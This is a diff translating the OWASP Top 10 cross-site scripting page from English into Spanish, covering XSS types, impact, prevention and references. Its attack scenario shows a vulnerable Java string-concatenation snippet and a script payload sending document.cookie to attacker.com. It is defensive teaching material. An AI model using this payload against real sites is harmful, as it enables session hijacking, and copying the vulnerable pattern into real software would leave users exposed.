@@ -21,42 +21,107 @@ redirect_from:
 
 {% include risk_begin.html %}
 {%- include risk_description.html pos="firstLeft" -%}
-Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks.
+
+Existen herramientas automatizadas que permiten detectar y explotar las
+tres formas de XSS, y también se encuentran disponibles kits de
+explotación gratuitos.
+
 {%- include risk_description.html pos="mid" -%}
-XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.<br>
-Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET.
+
+XSS es la segunda vulnerabilidad más frecuente en OWASP Top 10, 
+y se encuentra en alrededor de dos tercios de todas las aplicaciones.<br>
+Las herramientas automatizadas pueden detectar algunos problemas XSS 
+en forma automática, particularmente en tecnologías maduras como PHP,
+J2EE / JSP, y ASP.NET.
+
 {%- include risk_description.html pos="right" -%}
-The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.
+
+El impacto de XSS es moderado para el caso de XSS Reflejado y XSS en
+DOM, y severa para XSS Almacenado, que permite ejecutar
+secuencias de comandos en el navegador de la víctima, para robar
+credenciales, secuestrar sesiones, o la instalación de software malicioso
+en el equipo de la víctima.
+
 {%- include risk_end.html -%}
 
 {%- include t10_subsection_begin.html -%}
 {%- include t10_subsection.html token="isTheApplicationVulnerable" pos="firstLeft" -%}
-There are three forms of XSS, usually targeting users' browsers:<br>
-* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.<br>
-* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.<br>
-* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.<br>
 
-Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
+Existen tres formas usuales de XSS para atacar a los navegadores de
+los usuarios<br>
+* **XSS Reflejado**: la aplicación o API utiliza datos sin validar,
+suministrados por un usuario y codificados como parte del HTML o
+Javascript de salida. No existe una cabecera que establezca la
+[Política de Seguridad de Contenido (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). 
+Un ataque exitoso permite al atacante ejecutar comandos arbitrarios (HTML y
+Javascript) en el navegador de la víctima. Típicamente el usuario
+deberá interactuar con un enlace, o alguna otra página controlada
+por el atacante, como un 
+[ataque de abrevadero](https://es.wikipedia.org/wiki/Ataque_de_abrevadero), 
+publicidad maliciosa, o similar.<br>
+* **XSS Almacenado**: la aplicación o API almacena datos
+proporcionados por el usuario sin validar ni sanear, los cuales
+posteriormente son visualizados o utilizados por otro usuario o un
+administrador. Usualmente es considerado como de riesgo de nivel
+alto o crítico.<br>
+* **XSS Basados en DOM**: los marcos de trabajo en JavaScript, aplicaciones de
+página única o APIs incluyen datos dinámicamente, controlables
+por un atacante. Idealmente, se debe evitar procesar datos
+controlables por el atacante en APIs no seguras.<br>
+
+Los ataques XSS incluyen el robo de la sesión, apropiación de la
+cuenta, evasión de autentificación de múltiples pasos, reemplazo de
+nodos DOM, inclusión de troyanos de autentificación, ataques contra el
+navegador, descarga de software malicioso, registradores de teclas 
+(_keyloggers_), y otros tipos de ataques al lado cliente.<br>
+
 
 {%- include t10_subsection.html token="howToPrevent" pos="right" -%}
-Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:<br>
-* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.<br>
-* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP Cheat Sheet 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) has details on the required data escaping techniques.<br>
-* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the [OWASP Cheat Sheet 'DOM based XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).<br>
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).<br>
+
+Prevenir XSS requiere mantener los datos no confiables
+separados del contenido activo del navegador.<br>
+* Utilizar marcos de trabajo seguros que, por diseño, automáticamente
+codifican el contenido para prevenir XSS, como en Ruby on Rails o
+React JS. Conozca la limitación de  la protección XSS de cada marco de 
+y maneje de forma adecuada los casos de usos no cubiertos.<br>
+* Escapar datos de requerimientos HTTP no confiables con base en el contexto,
+en la salida HTML (cuerpo, atributos, JavaScript,
+CSS, o URL), para resolver vulnerabilidades de
+XSS Reflejado y XSS Almacenado. 
+La [hoja de trucos OWASP para prevenir XSS'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+tiene detalles sobre las técnicas para escapar requeridas.<br>
+* Aplicar codificación sensitiva al contexto, cuando se modifica
+el documento en el navegador del cliente, ayuda a prevenir
+DOM XSS. Cuando no se puede evitar, se pueden aplicar técnicas para 
+escpar sensitivas al contexto para la API del navegador como se describe en
+[la hoja de trucos OWASP para evitar XSS DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).<br>
+* Habilitar una [Política de Seguridad de Contenido (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+es una defensa profunda para la mitigación de vulnerabilidades
+XSS. Es efectiva si no hay otras vulnerabilidades que
+permitan colocar código malicioso vía inclusión de archivos
+(e.g vulnerabilidad de [cruce de directorio](https://es.wikipedia.org/wiki/Directory_traversal) que sobreescriba, o librerías vulnerables
+provenientes de Redes de Distribución de Contenidos (CDN)).<br>
 
 {%- include t10_subsection.html token="exampleAttackScenarios" pos="left" -%}
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:<br>
+
+**Escenario 1**: la aplicación utiliza datos no confiables en la
+construcción del código HTML sin validarlos ni escapar:<br>
     {% include code_red_begin.html -%} (String) page += "<input name='creditcard' type='TEXT' {%- include code_red_end.html %}
     {% include code_red_begin.html -%} value='" + request.getParameter("CC") + "'>"; {%- include code_red_end.html %}
 
-The attacker modifies the ‘CC’ parameter in the browser to:<br>
+
+El atacante modifica el parámetro “CC” en el navegador por:<br>
     {% include code_red_begin.html -%} '>&lt;script>document.location= {%- include code_red_end.html %}
     {% include code_red_begin.html -%} 'http://www.attacker.com/cgi-bin/cookie.cgi? {%- include code_red_end.html %}
     {% include code_red_begin.html -%} foo='+document.cookie&lt;/script>'. {%- include code_red_end.html %}
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. <br>
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+
+Este ataque causa que el identificador de sesión de la víctima
+sea enviado al sitio web del atacante, permitiéndole secuestrar
+la sesión actual del usuario.
+**Nota**: los atacantes también pueden utilizar XSS para anular
+cualquier defensa contra Falsificación de Peticiones en Sitios
+Cruzados (CSRF) que la aplicación pueda utilizar.
 
 {%- include t10_subsection.html token="references" pos="right" -%}
 **OWASP**<br>
@@ -71,7 +136,7 @@ This attack causes the victim’s session ID to be sent to the attacker’s webs
 * [OWASP Cheat Sheet: XSS Filter Evasion](/www-community//xss-filter-evasion-cheatsheet)<br>
 * [OWASP Java Encoder Project](/www-project-java-encoder) ([old wiki](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project))<br>
 <br>
-**External**<br>
+**Externos**<br>
 * [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)<br>
 * [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
 {% include t10_subsection_end.html %}
